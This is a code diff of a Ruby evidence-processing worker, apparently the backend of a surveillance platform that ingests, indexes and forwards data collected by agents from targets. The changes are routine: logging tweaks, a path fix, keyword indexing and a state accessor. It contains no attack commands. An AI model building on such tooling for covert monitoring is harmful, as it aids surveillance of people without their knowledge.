@@ -55,7 +55,6 @@ class InstanceWorker
     @agent = Item.agents.where({ident: @ident, instance: @instance, status: 'open'}).first
     raise InvalidAgentTarget.new("Agent \'#{@ident}:#{@instance}\' cannot be found.") if @agent.nil?
     @target = @agent.get_parent
-    trace :debug, "GET_AGENT_TARGET agent: #{@agent['name']} target: #{@target['name']}"
   end
 
   def initialize(instance, ident)
@@ -116,7 +115,7 @@ class InstanceWorker
               RCS::DB::GridFS.delete(raw_id, "evidence")
 
               Dir.mkdir "decoding_failed" unless File.exists? "decoding_failed"
-              path = "decoding_failed/#{evidence_id}.dec"
+              path = "decoding_failed/#{raw_id}.dec"
               f = File.open(path, 'wb') {|f| f.write decoded_data}
               trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
               next
@@ -129,7 +128,7 @@ class InstanceWorker
             end
 
             ev_type = ''
- ``
+
             evidences.each do |ev|
 
               next if ev.empty?
@@ -146,7 +145,11 @@ class InstanceWorker
                 ev.extend DefaultProcessing
               end
 
+              # post processing
               ev.process if ev.respond_to? :process
+
+              # full text indexing
+              ev.respond_to?(:keyword_index) ? ev.keyword_index : ev.default_keyword_index
 
               trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] processing evidence of type #{ev[:type]} (#{raw.bytesize} bytes)"
 
@@ -174,8 +177,6 @@ class InstanceWorker
                   # check if there are matching alerts for this evidence
                   RCS::DB::Alerting.new_evidence(evidence) unless evidence.nil?
 
-                  trace :debug, "FORWARDING #{evidence.type}"
-
                   # forward the evidence to connectors (if any)
                   RCS::DB::Connectors.new_evidence(evidence) unless evidence.nil?
                 end
@@ -199,7 +200,7 @@ class InstanceWorker
             retry
           rescue Exception => e
             trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] Unrecoverable error processing evidence #{raw_id}: #{e.message}"
-            trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")
+            trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")
 
             Dir.mkdir "decoding_failed" unless File.exists? "decoding_failed"
             path = "decoding_failed/#{raw_id}.dec"
@@ -243,6 +244,10 @@ class InstanceWorker
   
   def stopped?
     @state == :stopped
+  end
+
+  def state
+    @state
   end
 
   def forwarding?
